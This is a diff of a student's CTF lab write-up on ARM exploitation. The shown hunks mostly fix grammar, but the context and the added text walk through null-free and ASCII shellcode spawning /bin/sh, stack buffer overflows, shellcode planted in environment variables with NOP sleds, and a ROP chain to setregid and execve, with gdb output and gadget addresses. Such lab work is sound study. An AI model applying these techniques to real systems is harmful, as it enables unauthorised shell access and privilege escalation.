@@ -121,8 +121,8 @@ Check that with make objdump and make print. No 00 or \x00!
 This problem requires you to run the exactly same semantic code as the previous question.
 
 1. To remove `0` from `swi 0`, use `swi 1010101` or `svc 1010101`.
-   - The immediate value with `swi` or `svc` have nothing to do with its execution, so you can use`1010101` to remove `0x00` in binary.
-2. To remove `0` to set `r0`'s value in `r1`, you can use the stack
+   - The immediate value of `swi` or `svc` have nothing to do with its execution, so you can use`1010101` to remove `0x00` in binary.
+2. To remove `0` and set `r0`'s value in `r1`, you can use the stack
 
    - Set `getegid`'s return value in `r1`
 
@@ -131,9 +131,9 @@ This problem requires you to run the exactly same semantic code as the previous 
    pop     {r1}
    ```
 
-3. To remove in the second block, you can use the thumb mod.
+3. To remove in the second block, you can use the thumb mode.
 
-   - This is how to enter the thumb mode.
+   - This is how to enter the thumb mode and execute instructions in the thumb mode.
 
    ```armasm
    .code 32
@@ -150,7 +150,7 @@ This problem requires you to run the exactly same semantic code as the previous 
      .ascii "/bin/shX"
    ```
 
-You've got the flag!
+You've got the flag.
 
 ```bash
 TXK220008@ctf-vm3:~/unit2/2-nonzero-shellcode-arm $ ./solve2.py ; ./2-nonzero-shellcode-arm
@@ -187,7 +187,7 @@ _bin_sh:
 
 The first problem is `mov`. Its byte code contains some non-ascii code.
 
-To make it ascii, you can convert it into `eorvc` which does not contain non-ascii. `swi`, which is equivalent to `svc` is equivalent to `svcvc`. It does not use ascii characters.
+To make it ascii, you can convert it into `eorvc` which does not contain non-ascii. `swi`, which is equivalent to `svc` is equivalent to `svcvc`. It does not use an ascii character.
 
 Since `pc` points to the instruction being fetched, you can convert `adr r0, _bin_sh` into `subvc r0, pc, #0` by reordering the instructions.
 
@@ -232,11 +232,11 @@ The program runs `setregid(getegid(), getegid())` for you.
 
 Actually, this problem can be solved whithin 12 bytes.
 
-First, embed shellcode, which we used in `2-nonzero-shellcode-arm`, as an environmental variable. Then just jump to the address where you embed the shellcode!!
+First, embed shellcode, which we used in `2-nonzero-shellcode-arm`, as an environmental variable. Then just jump to the address where you embed the shellcode.
 
 However, it is a little bit tricky because it uses a gigantic nop sled and an alignment.
 
-To see where the shellcode is, you need to debug it in gdb. That's why you need a huge nop sled. Also, the variable is on the stack, which means it is sometimes mal-aligned. I.e., instructions may not start with an address divisible by 4. To resolved, add some alignments.
+To see where the shellcode is, you need to debug it in gdb. That's why you need a huge nop sled. gdb introduces some environmental variables and we haveto use a nop sled to avoid it. Also, the variable is on the stack, which means it is sometimes mal-aligned. I.e., instructions may not start with an address divisible by 4. To resolve it, add some alignments.
 
 You can't use null bytes to jump. Use `movt` and `movw` to set 32bit address in a register like this.
 
@@ -328,11 +328,11 @@ Please type your name:
 
 - [x] find a buffer start
 
-From the `stack-ovfl-arm.c`, you can tell the offset from the buffer. It's 80 bits. You can also check it using `gdb`.
+From the `stack-ovfl-arm.c`, you can tell the offset from the buffer. It's 80 bytes. You can also check it using `gdb`.
 
 - [x] detect return address
 
-Here, we embed the shellcode, input the sufficient number of `nop`s, and address of the shellcode.
+Here, we embed the shellcode, input a sufficient number of `nop`s, and address of the shellcode.
 
 ```python
         bufAddr = int(r.split(b":")[1].split(b"\n")[0], 16)
@@ -346,7 +346,7 @@ Here, we embed the shellcode, input the sufficient number of `nop`s, and address
 
 You may encounter a problem that you can't execute it. Use loop and try-except to deal with it.
 
-You get the flag.
+You've get the flag!
 
 ```bash
 TXK220008@ctf-vm3:~/unit2/5-stack-ovfl-arm $ ./solve5.py
@@ -374,7 +374,7 @@ Here are the tasks for this problem
 - [ ] detect the location of the return address
 - [ ] overflow the buffer to input the address of environmental variable
 
-From gdb debugging, the buffer address start with `0xfffef0e4` and the return address is `0xfffef0ec`.
+From gdb debugging, the buffer address starts with `0xfffef0e4` and the return address is `0xfffef0ec`.
 
 ```gdb
 read@plt (
@@ -396,12 +396,10 @@ Stack level 0, frame at 0xfffef0f0:
   lr at 0xfffef0ec
 ```
 
-The difference is 8 bytes, pad the buffer with 8 bytes.
+The difference is 8 bytes, pad the buffer with 8 bytes. However, there still remains a problem.
 
-However, there still remains a problem.
-
-The address `pwntools` touches is different from the address you touch in the normal gdb. To deal with it you need to use `gdb <program> core`.
-Moreover, you need to pad `shellcode` to make it the program we want execute aligned, i.e., make the starting address divisible by 4. I appended 3 bytes.
+The address `pwntools` touches is different from the address you touch in the normal gdb. To deal with it you need to use `gdb <program> core`, i.e., `gdb 6-stack-ovfl-use-envp-arm`.
+Moreover, you need to pad `shellcode` to make the program aligned, i.e., make the starting address divisible by 4. I appended 3 bytes.
 
 Here is how you check the address we want to jump to.
 
@@ -441,7 +439,7 @@ gef➤  x/s *((char **)environ) + 10
 - [x] detect the location of the buffer
 - [x] detect the location of the return address
 
-Before that, you embed environmental variable and get it like this. You need to execute and crash `solve6.py` first and then check as above.
+Before that, you embed the environmental variable and get the address. You need to execute it and crash `solve6.py` first and then check the address.
 
 ```python
 var_name = "SHELLCODE"
@@ -535,6 +533,114 @@ Call:
     execve("/bin/sh", 0, 0);
 ```
 ````
+
+When I execute the program, it says the following.
+
+```bash
+TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ ./8-rop0-arm
+Please call setregid(gid, gid);
+You can check the gid by running 'cat /etc/group'
+For example, the gid of week5-50001-ok is 50001
+And then call execve("/bin/sh", 0, 0)
+Or you can use a symlink
+Please type your name:
+aaa
+Hello aaa
+$!
+```
+
+I get my gid, which is `1020`.
+
+```bash
+TXK220008@ctf-vm2:~/unit2/8-rop0-arm $ cat /etc/group | grep TXK
+TXK220008:x:1020:
+```
+
+So, the task of this problem is to execute the following commands.
+
+- [ ] `setregid(1020, 1020)`
+- [ ] `execve("/bin/sh", 0, 0)`
+
+Let's overflow the input buffer to do this.
+
+We want to call two functions, `setregid` and `execve`, so the task is to use `input_func`'s return address to call multiple functions.
+
+```gdb
+[#0] 0x10594 → input_func()
+[#1] 0x105ec → main()
+```
+
+Thus, what we need to do are
+
+- [ ] detect buffer address
+- [ ] get the addresses of syscalls
+- [ ] send addresses and arguments by buffer overflow
+  - [ ] the first package contains `setregid`, `rop2`, `1020`, and `1020`. `rop2` is to pop 2 elements in the stack
+  - [ ] the second package contains `execve`, `"/bin/sh"`, `rop3`, `0`, `0`. `rop3` is to pop 3 elements in the stack
+  - [ ] the last package contains `exit`
+
+First, we check the buffer address. It is `0xffcd5118` from gdb.
+
+```gdb
+read@plt (
+   $r0 = 0x000000,
+   $r1 = 0xffcd5118 → 0x00000000,
+   $r2 = 0x000100,
+   $r3 = 0xffcd5118 → 0x00000000
+)
+```
+
+The saved address from `input_func` is `0xffcd5190`.
+
+```gdb
+gef➤  info frame
+Stack level 0, frame at 0xffcd5198:
+ pc = 0x105b0 in input_func; saved pc = 0x10648
+ called by frame at 0xffcd51b8
+ Arglist at 0xffcd519c, args:
+ Locals at 0xffcd519c, Previous frame's sp is 0xffcd5198
+ Saved registers:
+  r11 at 0xffcd5190, lr at 0xffcd5194
+```
+
+`0xffcd5190 - 0xffcd5118 = 120`, so first pad buffer with 120 bytes.
+
+- [x] detect buffer address
+
+You can learn the addresses of syscalls by reading `objdump -d ./8-rop0-arm`
+
+```armasm
+000103dc <execve@plt>:
+   103dc:	e28fc600 	add	ip, pc, #0, 12
+   103e0:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
+   103e4:	e5bcfc3c 	ldr	pc, [ip, #3132]!	; 0xc3c
+
+000103f4 <setregid@plt>:
+   103f4:	e28fc600 	add	ip, pc, #0, 12
+   103f8:	e28cca10 	add	ip, ip, #16, 20	; 0x10000
+   103fc:	e5bcfc2c 	ldr	pc, [ip, #3116]!	; 0xc2c
+```
+
+You can overflow this program and get the address of syscalls.
+
+```gdb
+gef➤  print execve
+$2 = {<text variable, no debug info>} 0xf77ffa50 <execve>
+gef➤  print setregid
+$3 = {int (gid_t, gid_t)} 0xf7820710 <__setregid>
+gef➤  print exit
+$4 = {void (int)} 0xf77b0774 <__GI_exit>
+```
+
+These instructions look useful.
+
+```armasm
+0x000105a0: ldr r0, [pc, #0x24]; bl #0x3a0; mov r0, r0; sub sp, fp, #4; pop {fp, pc};
+0x00010634: ldr r3, [r5], #4; mov r2, sb; mov r1, r8; mov r0, r7; blx r3;
+0x00010650: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+```
+
+- [x] get the addresses of syscalls
 
 ## (bonus) 9-rop1-arm
 
